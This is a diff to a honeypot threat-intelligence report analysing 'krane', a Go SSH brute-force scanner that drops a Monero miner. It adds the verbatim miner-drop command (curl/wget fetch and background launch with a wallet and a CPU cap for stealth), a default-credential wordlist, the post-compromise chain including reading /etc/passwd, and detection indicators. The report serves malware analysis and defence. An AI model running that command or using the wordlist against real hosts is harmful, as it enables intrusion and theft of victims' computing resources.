@@ -9,13 +9,15 @@ session_id: d37a15f3cfc8
 login_success: true
 command_count: 1
 download_count: 5
+monero_wallet: 46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa
 tags:
   - honeypot
   - cowrie
   - threat/malware
   - threat/botnet
   - threat/brute-force
-  - threat/ddos
+  - threat/cryptominer
+  - threat/monero
   - language/go
   - origin/romanian
 ---
@@ -24,9 +26,9 @@ tags:
 
 ## Executive Summary
 
-On 2026-04-20 at 07:24 UTC, a honeypot session captured a fully automated compromise-and-deploy sequence. The attacker logged in with password `050602`, ran a dropper script (`bins.sh`), and downloaded five binaries from C2 `89.190.156.19`. Static analysis of the captured binaries reveals a **custom Go-compiled SSH brute-force and SYN scanner** authored by a **Romanian-speaking developer**, operating under the project name "krane". A companion DDoS tool ("hoho", not captured) was also referenced.
+On 2026-04-20 at 07:24 UTC, a honeypot session captured a fully automated compromise-and-deploy sequence. The attacker logged in with password `050602`, ran a dropper script (`bins.sh`), and downloaded five binaries from C2 `89.190.156.19`. Deep static analysis of the captured binaries reveals a **custom Go-compiled SSH brute-force scanner and Monero cryptominer dropper** authored by a **Romanian-speaking developer** whose Linux username is **`krane`**. A companion DDoS tool ("hoho", not captured) was also referenced.
 
-This is **not a Mirai variant** — the krane binaries are statically-compiled Go binaries (~6MB), purpose-built for SSH credential spraying and network scanning with a built-in SYN flood capability.
+This is **not a Mirai variant** — the krane binaries are statically-compiled Go binaries (~6MB) that scan the internet for SSH on port 22, brute-force credentials, then drop an XMRig-family Monero miner (`vltrig`) on each compromised host. The binary also embeds a **Romanian anti-theft rant** directed at anyone who copies the source code, confirming active development and author ego-investment in the project.
 
 ---
 
@@ -238,21 +240,199 @@ See companion file: `krane-iocs.md`
 
 ---
 
+## Stage 3 — Cryptominer Deployment (NEW — from deep binary analysis)
+
+The binary's third stage, revealed by full string extraction from `krane_mips`, deploys a **Monero (XMR) miner** on every successfully compromised host.
+
+### Miner Drop Command (verbatim from binary)
+
+```bash
+cd /tmp;
+curl -o vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz -L \
+  || wget -O vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz;
+tar -xvf vltrig.tar.gz;
+chmod +x vltrig && rm -rf config.json;
+sleep 3;
+./vltrig \
+  --user 46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa \
+  --pass x \
+  --donate-level 0 \
+  --background \
+  --cpu-no-yield \
+  --cpu-max-threads-hint=70
+```
+
+### Miner Details
+
+| Field | Value |
+|-------|-------|
+| Tool | `vltrig` — XMRig-family miner from HashVault |
+| Currency | **Monero (XMR)** |
+| Wallet | `46qJM6LUpYjVPVS6CYRx3x9HpXboYd3gK5HBd9UgWtCGcrNQJKgTxGJ1TcndT3SLDNFnJvjo8LzjpX2uZL7aEtZiFrsGTLa` |
+| Pool / password | `x` (default XMRig pool pass — likely a public pool via C2) |
+| CPU cap | 70% (`--cpu-max-threads-hint=70`) — deliberate stealth to avoid detection |
+| Donation | `--donate-level 0` — removes XMRig developer donation (evades known pool fingerprint) |
+| Persistence | `--background` — detaches from terminal |
+| Config wipe | `rm -rf config.json` — forces CLI args, prevents accidental config-file override |
+
+**Staging via GitHub:** The miner is fetched from a GitHub releases page (`HashVault/vltrig`), not the C2 server. This abuses GitHub's CDN trust and bypasses IP-based blocklists on the C2.
+
+---
+
+## Operator Live Dashboard (stats format string)
+
+The binary logs a real-time stats line during operation — this is what the operator sees in their terminal:
+
+```
+[stats] brute=%d/%d  scan=%d/%d  queued=%d  total=%d  passfile=%d
+        scanned=%d(+%d/s)  found=%d  range=%d.*.*.*  throttle=%s
+        CPU=%.1f%%  MEM=%.1f%%
+```
+
+Fields decoded:
+- `brute` — successful / total brute force attempts
+- `scan` — SSH ports found open / total IPs scanned
+- `queued` — IPs queued for brute force
+- `scanned(+N/s)` — cumulative scan rate in IPs per second
+- `found` — total confirmed compromises (logGotcha events)
+- `range` — current /8 class-A block being swept (e.g. `45.*.*.*`)
+- `throttle` — current throttle state
+- `CPU/MEM` — live resource stats from `/proc/stat` and `/proc/meminfo`
+
+---
+
+## Author Attribution
+
+### Handle: `krane`
+
+Build machine path confirms the developer's Linux username:
+
+```
+/home/krane/Desktop/Seriozitate/Afacere-la-cheie/Client-Dropat-In-Servere-Prinse/src-copie-go/
+```
+
+The project name **is** the author's handle — they named the binary after themselves.
+
+### Anti-Theft Watermark (Romanian)
+
+Embedded verbatim in the binary — a rant directed at anyone who copies the source:
+
+```
+[+] GESTUL TAU, FOARTE URAT, CA AI INDRAZNIT SA FURI DE LA MINE,
+    CARE EU SUNT SMECHER PENTRU MULTA LUME NU DOAR PENTRU TINE,
+    DAR E URAT SA ZIC ASTA, IN SFARSIT [+]
+```
+
+**English translation:**
+> *"YOUR GESTURE, VERY UGLY, THAT YOU DARED TO STEAL FROM ME, WHO I AM CLEVER FOR MANY PEOPLE NOT JUST FOR YOU, BUT IT IS UGLY TO SAY THIS, FINALLY"*
+
+This watermark serves two purposes: (1) it asserts ownership of the codebase, and (2) it confirms the binary is an **original custom tool** — not a leaked or forked project — with an author who is actively maintaining it and is aware of code theft in the underground. The `[+]` bracketing mirrors the log format used throughout the tool.
+
+### Build Timeline
+
+- Go crypto module pinned to `golang.org/x/crypto@v0.0.0-20220112180741-5e0467b6c7ce` — January 12, 2022
+- Binary built no earlier than **2022-01-12**
+- Go version `go1.26.2` embedded — recent toolchain
+
+---
+
+## Full Credential Wordlist (extracted from binary)
+
+Targeting categories: generic Linux, IoT defaults, cloud/DevOps, Chia blockchain nodes, database services.
+
+```
+root:root         root:1234          root:12345         root:123456
+root:Root123456   root:Root1234      root:1qaz@WSX      root:qwert
+root:Admin123     root:smoothwall
+admin:admin       admin:Admin123     admin:zaq12wsx
+test:test         test:123456        test:test123       test:1234567890
+user:123456       user2:77777777
+chia:chia         chia:chia123       chia:Chia123       chia:Chia123456
+chia:Test123      chia:Test1234      chia:Test123456    chia:Admin123
+chia:1qaz@WSX     chia:admin
+es:123456         es:es123
+odoo:odoo
+mysql:mysql
+postgres:postgres
+deployer:deployer deploy:deploy
+jenkins:jenkins
+ftpuser:ftpuser
+ansible:ansible   ansible:Ansible123
+vagrant:vagrant
+hadoop:hadoop123  hadoop:123456
+oracle:oracle
+ubuntu:ubuntu     ubuntu:123456
+centos:centos
+nagios:nagios
+minecraft:minecraft
+azureuser:azureuser
+abbas:abbas
+secrettom:321
+tlqtest1:tlqtest1123
+```
+
+**Notable targeting:**
+- `chia:*` — Chia Network blockchain node operators (CPU/storage farming)
+- `azureuser:azureuser` — Azure VM default user
+- `minecraft:minecraft` — Minecraft server hosts (high-CPU, often poorly secured)
+- `ansible/vagrant/deployer` — DevOps infrastructure accounts
+- `smoothwall` — Smoothwall firewall appliance default
+
+---
+
+## AWS-Aware Operation
+
+The binary contains a specific AWS execution path:
+
+```
+[syn] raw socket OK (AWS mode), outbound IP: <ip>
+```
+
+When running inside AWS EC2, raw socket behaviour is adjusted — likely because EC2 restricts raw packet injection and the binary detects this and falls back to TCP dial mode. This suggests the author has tested and operates from AWS instances.
+
+---
+
+## Post-Compromise Behaviour (full chain)
+
+```
+1. SSH brute force succeeds
+2. logGotcha() — logs host:user:pass to operator's log file
+3. uname -a — fingerprints the host
+4. cat /etc/passwd — exfiltrates local user list
+5. HarvestAndMerge() — adds creds to the harvested pool
+6. Drop miner:
+     cd /tmp
+     curl || wget → vltrig.tar.gz (from GitHub CDN)
+     tar -xvf → extract
+     rm -rf config.json
+     ./vltrig --user <XMR wallet> --cpu-max-threads-hint=70 --background
+7. Daemonize: IP_DAEMONIZED=1 env var prevents double-daemonize
+8. Continue scanning from compromised host (propagation)
+```
+
+---
+
 ## Detection Opportunities
 
 1. **Network:** Outbound connections to `89.190.156.19` on any port
 2. **Network:** DNS lookups for `minecraftpixelger39clone.dedyn.io`
 3. **Network:** HTTP GET to `api.ipify.org?format=text` from a server process
-4. **Host:** `ulimit -n 99999` in shell history (pre-execution setup)
-5. **Host:** Process launched from `/tmp` or `/var/run` with name matching `krane_*` or `hoho.*`
-6. **Host:** Self-deleting executables (fork-then-unlink pattern)
-7. **Network:** High-rate TCP SYN to port 22 across diverse /8 ranges
-8. **SSH logs:** Credential `050602` or common IoT defaults (pi/alpine/ubnt)
+4. **Network:** GitHub download of `HashVault/vltrig` from a server (not a dev machine)
+5. **Host:** Process named `vltrig` running from `/tmp`
+6. **Host:** `--cpu-max-threads-hint=70 --donate-level 0` in process arguments
+7. **Host:** `ulimit -n 99999` in shell history
+8. **Host:** Process launched from `/tmp` or `/var/run` named `krane_*` or `hoho.*`
+9. **Host:** `IP_DAEMONIZED=1` environment variable on a running process
+10. **Host:** Self-deleting executables in `/tmp`
+11. **Network:** High-rate TCP SYN flood targeting port 22 across diverse /8 ranges
+12. **SSH logs:** Entry password `050602` or credential pairs from the wordlist above
 
 ---
 
 ## Notes
 
-- The Go module domain `minecraftpixelger39clone.dedyn.io` uses dedyn.io (desec.io dynamic DNS) — low-cost, privacy-preserving, and easy to rotate. Consider blocking `*.dedyn.io` if not used legitimately in your environment.
+- The Monero wallet `46qJM6...` is a permanent attribution anchor — any pool reporting against this wallet confirms krane infrastructure activity.
+- The Go module domain `minecraftpixelger39clone.dedyn.io` uses dedyn.io (desec.io dynamic DNS) — low-cost, privacy-preserving, easy to rotate. Consider blocking `*.dedyn.io` if not used legitimately.
 - The `ulimit -n 99999` trick is a strong behavioural signal — legitimate processes rarely need 100k file descriptors.
-- All 4 captured krane binaries are identical in functionality (cross-compiled from the same source). SHA256 differences reflect architecture-specific compilation, not different codebases.
+- All 4 captured krane binaries are functionally identical (same source, cross-compiled). SHA256 differences are architecture-specific, not different codebases.
+- The embedded anti-theft message confirms this is **original code** under active development by a single Romanian-speaking author who goes by the handle `krane`.
